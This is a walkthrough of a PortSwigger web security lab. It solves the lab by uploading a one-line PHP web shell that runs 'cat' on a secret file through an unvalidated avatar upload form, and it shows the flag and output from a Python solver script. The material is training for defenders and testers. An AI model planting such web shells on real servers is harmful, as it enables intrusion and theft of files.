# Lab: Remote code execution via web shell upload

----

### Instructions

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter` 


### Solution

We can begin this lab by first creating a simple webshell to issue commands and read the flag:

```php
<?php system('cat /home/carlos/secret'); ?>
```

This can be saved as `flag.php`

We can log in with the provided credentials, and load the php file as a profile picture.

Once loaded, we get the message:

```
The file avatars/flag.php has been uploaded.
```

We can right click on the recently loaded "image" and open it in a new tab at:

```
https://0abf00c503c5e6ff8132ad0000bb0075.web-security-academy.net/files/avatars/flag.php
```

Which reveals the flag:

```
fvtTs8gobpxnazvYFRdWv0VzWwQeiYHT
```

This can be submitted in `/submitSolution` to finish the lab.

### Python Solution

See `file_upload_01.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/File_Upload_Vulnerabilities/File_Upload_01_rce_via_webshell_upload]
└─$ python file_upload_01.py https://0a74001104f779988025bc5c0030002e.web-security-academy.net/
[+] Logged in as wiener
[+] File uploaded
[+] The lab's flag is: RapC046ofKXhijo1qZzcbDaujEGoBF6e
[*] Submitting flag to solve lab...
[+] Successfully submitted the flag
```